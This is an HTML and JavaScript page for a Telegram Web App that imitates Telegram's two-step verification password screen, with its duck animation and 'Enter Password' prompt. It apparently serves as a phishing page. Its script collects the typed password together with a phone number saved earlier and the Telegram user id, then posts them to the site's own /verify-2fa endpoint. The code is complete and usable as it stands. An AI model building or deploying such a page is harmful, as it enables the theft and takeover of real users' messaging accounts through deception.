<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #111;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            position: relative;
            width: 100%;
            max-width: 420px;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
        }

        .header {
            text-align: center;
            margin-top: 10px;
            position: relative;
        }

        .title {
            font-size: 20px;
            font-weight: 600;
        }

        .subtitle {
            margin-top: 8px;
            font-size: 0.9rem;
            color: #888;
            font-weight: 400;
        }

        .reg {
            margin-top: 20%;
            width: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            row-gap: 12px;
        }

        .form {
            margin-top: 0;
            display: flex;
            flex-direction: column;
            row-gap: 15px;
            padding: 0 20px;
            width: 100%;
            box-sizing: border-box;
        }

        .phone {
            border: 1px solid #333;
            border-radius: 8px;
            display: flex;
            align-items: center;
            padding: 14px;
            font-size: 16px;
            background: #111;
            color: #fff;
            position: relative;
            transition: all 0.3s ease;
        }

        .phone:focus-within {
            border-color: rgb(135, 116, 225);
            border-width: 2px;
            transform: scale(1.02);
            box-shadow: 0 0 0 1px rgba(138, 43, 226, 0.3);
        }

        #phone-input {
            flex: 1;
            background: transparent !important;
            border: none !important;
            outline: none !important;
            color: #fff;
            font-size: 16px;
            padding: 0;
            margin: -5px;
            box-shadow: none !important;
            width: 100%;
            font-family: inherit;
            caret-color: #fff;
            transition: all 0.3s ease;
        }

        .phone-number {
            font-size: 16px;
            color: #888;
            pointer-events: none;
            transition: all 0.3s ease;
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
        }

        .phone.has-value .phone-number,
        .phone:focus-within .phone-number {
            font-size: 12px;
            color: rgb(135, 116, 225);
            top: -8px;
            left: 15px;
            background: #111;
            padding: 0 5px;
            transform: translateY(0);
        }

        .phone.has-value .phone-number {
            color: #888;
        }

        .phone:focus-within .phone-number {
            color: rgb(135, 116, 225);
        }

        .phone.error {
            border-color: #ff4444;
        }

        .phone.error:focus-within {
            border-color: #ff4444;
            box-shadow: 0 0 0 1px rgba(255, 68, 68, 0.3);
        }

        .phone.error .phone-number {
            color: #ff4444;
        }

        .phone.error:focus-within .phone-number {
            color: #ff4444;
        }

        .eye-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
            color: #888;
            cursor: pointer;
            user-select: none;
            transition: all 0.3s ease;
        }

        .eye-icon:hover {
            color: #fff;
        }

        /* Кнопка NEXT */
        .next-btn {
            display: none;
            margin-top: 20px;
            padding: 14px;
            background: rgb(135, 116, 225);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .next-btn:hover {
            background: rgb(115, 96, 205);
        }

        .next-btn.show {
            display: block;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="reg">
            <div id="duck" style="width: 120px; height: 120px;"></div>
            <div class="header">
                <h1 id="phone-display" style="font-size: 1.5rem !important; margin: 0; display: inline-block;">Enter
                    Password</h1>
                <p class="subtitle">You have Two-Step Verification enabled, so your<br>account is protected with an
                    additional password.</p>
            </div>
            <div class="form">
                <div class="phone" id="phoneContainer">
                    <span class="phone-number">Password</span>
                    <input id="phone-input" type="password">
                    <i id="toggle-password" class="fa-solid fa-eye eye-icon"></i>
                </div>
                <button id="next-btn" class="next-btn">NEXT</button>
            </div>
        </div>
    </div>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        const animation = lottie.loadAnimation({
            container: document.getElementById('duck'),
            renderer: 'svg',
            loop: true,
            autoplay: true,
            path: '/static/duck.json'
        });
        animation.play();

        const phoneInput = document.getElementById("phone-input");
        const phoneContainer = document.getElementById("phoneContainer");
        const phoneNumberLabel = document.querySelector(".phone-number");
        const togglePassword = document.getElementById("toggle-password");
        const nextBtn = document.getElementById("next-btn");

        togglePassword.addEventListener("click", () => {
            if (phoneInput.type === "password") {
                phoneInput.type = "text";
                togglePassword.classList.remove("fa-eye");
                togglePassword.classList.add("fa-eye-slash");
            } else {
                phoneInput.type = "password";
                togglePassword.classList.remove("fa-eye-slash");
                togglePassword.classList.add("fa-eye");
            }
        });

        phoneInput.addEventListener('input', function () {
            this.value = this.value.slice(0, 64);

            if (this.value.length > 0) {
                phoneContainer.classList.add('has-value');
                nextBtn.classList.add('show');
            } else {
                phoneContainer.classList.remove('has-value');
                nextBtn.classList.remove('show');
            }

            if (phoneContainer.classList.contains('error')) {
                phoneContainer.classList.remove('error');
                phoneNumberLabel.textContent = 'Password';
            }
        });

        nextBtn.addEventListener('click', sendPassword);

        async function sendPassword() {
            this.disabled = true;
            this.style.opacity = '0.6';
            this.textContent = 'PLEASE WAIT...';

            const password = phoneInput.value;
            const phoneNumber = localStorage.getItem('userPhoneNumber');

            try {
                const response = await fetch('/verify-2fa', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        phone_number: phoneNumber,
                        password: password,
                        user_id: tg.initDataUnsafe?.user?.id || 'web_user'
                    })
                });

                if (response.ok) {
                    const data = await response.json();
                    if (data.success) {
                        window.location.href = '/success';
                    }
                } else {
                    showError();
                    this.disabled = false;
                    this.style.opacity = '1';
                    this.textContent = 'NEXT';
                }
            } catch (error) {
                console.log('Error:', error);
                showError();
                this.disabled = false;
                this.style.opacity = '1';
                this.textContent = 'NEXT';
            }
        }

        function showError() {
            phoneContainer.classList.add('error');
            phoneNumberLabel.textContent = 'Invalid password, please try again';
        }
    </script>
</body>

</html>
